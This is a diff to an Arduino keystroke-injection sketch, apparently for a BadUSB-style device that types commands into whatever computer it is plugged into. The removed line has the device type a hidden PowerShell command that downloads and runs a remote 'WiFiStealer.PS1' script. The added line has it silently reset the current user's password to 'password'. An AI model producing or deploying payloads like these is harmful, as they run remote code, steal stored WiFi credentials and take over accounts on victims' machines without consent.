@@ -13,8 +13,8 @@ void setup() {
 
   delay(2000);  // Delay 2 seconds
 
-  // Type the PowerShell command, specify remote powershell script location 
-  Keyboard.print("powershell /w 1 /C Set-ExecutionPolicy RemoteSigned;wget \"https://raw.githubusercontent.com/Mar0dev/LilyGo-TTGO-Examples/main/WiFiStealer.PS1\" -o \\d.ps1;\\d.ps1");
+  // Type the PowerShell command, change the admin password to "password". Change it if needed.
+  Keyboard.print("powershell /w 1 /C net user $env:USERNAME password");
 
   delay(1000);  // Delay 1 second
 
